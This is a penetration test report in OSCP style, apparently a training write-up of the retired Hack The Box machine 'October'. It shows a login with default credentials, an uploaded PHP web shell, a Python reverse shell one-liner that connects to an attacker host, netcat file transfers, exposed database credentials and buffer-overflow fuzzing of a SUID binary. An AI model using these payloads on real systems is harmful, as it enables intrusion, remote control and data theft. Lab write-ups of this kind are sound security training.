# HTB October - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-6-2

---

## 0. Lesson Learned

You must always check manually for sudo permissions and SUID binaries - don't rely on linPEAS for this.

---

## 1. Executive Summary

An external penetration test was conducted against a Linux-based target hosting a vulnerable instance of October CMS. The assessment identified multiple misconfigurations and application-level weaknesses that allowed an unauthenticated attacker to gain administrative access to the CMS backend, upload a malicious file, and obtain a remote shell as the web service user.

During post-exploitation, a locally installed SUID binary was identified as vulnerable to a classic stack-based buffer overflow, indicating a viable path to privilege escalation. However, exploitation of this condition was intentionally deferred due to time constraints and prioritization of Active Directory attack paths, which are more prevalent and higher-yield within the current OSCP exam structure.

---

## 2. Scope

- **Target:** 10.129.96.113
- **Environment:** HTB October (Retired Machine)
- **Testing Window:** 2026-6-2
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A full TCP-scan was conducted with Nmap:

```
nmap -p- -sCV 10.129.96.113 -T4 -oA october_initial
```

Revealing two exposed services:

- OpenSSH 6.6.1p1 on port 22
- Apache 2.4.7 hosting October CMS on port 80

The web application was identified as October CMS based on page content and directory structure.

---

## 5. Enumeration

Directory brute forcing was used to identify hidden application paths:

```
gobuster dir -u http://10.129.96.113 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Findings:

- `/backend` administrative portal discovered
- October CMS backend login page identified

Default credential testing performed against the backend login identified the following credentials:

```
admin : admin
```

Successful authentication confirmed weak access controls.

---

## 6. Initial Access

Authenticated access to the October CMS backedn allowed exploitation of a known file upload restriction bypass.

A PHP command execution payload was created and uploaded using an alternate file extension as `sh.php5`:

```
<?php $_REQUEST['x']($_REQUEST['c']); ?>
```

The payload was executed via the web-accessible media directory:

```
http://10.129.96.113/storage/app/media/sh.php5?x=system&c=pwd
```

A Python reverse shell was triggered through the payload:

```
http://10.129.96.113/storage/app/media/sh.php5?x=system&c=export RHOST="<attacker-ip>";export RPORT=443;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

And received with the listener:

```
nc -lnvp 443
```

Resulting in an interactive shell as `www-data`.

---

## 7. Post-Exploitation

Automated enumeration was performed with linPEAS and found:

- Kernel version: Linux 4.4.0
- MySQL service listening on localhost
- Database credentials stored in configuration files

Credential discovery at `/var/www/html/cms/config/database.php` recovered the credentials:

```
october : OctoberCMSPassword!!
```

---

## 8. Privilege Escalation

SUID binaries were enumerated to identify potential escalation paths:

```
find / -perm -4000 -ls 2>/dev/null
```

A custom SUID binary was identified:

```
/usr/local/bin/ovrflw
```

The binary was transfered to the attacker machine for analysis:

```
nc -w <attacker-ip> 999 < /usr/local/bin/ovrflw
```

And the binary was received on the attacker machine:

```
nc -l -p 999 > overflw
```

The checksum confirmed full file transfer:

```
md5sum ovrflw
```

Initial fuzzing revealed a segmentation fault:

```
./ovrflw $(python -c 'print"A"*200')
```

The vulnerability was confirmed as a stack-based buffer overflow requiring manual exploit development. Due to limited exam relevance and time constraints, further exploitation was deferred in favor of prioritizing Active Directory attack chains.

---

## 9. Appendix

October CMS - PHP Upload Protection Bypass -
[https://www.exploit-db.com/exploits/41936](https://www.exploit-db.com/exploits/41936)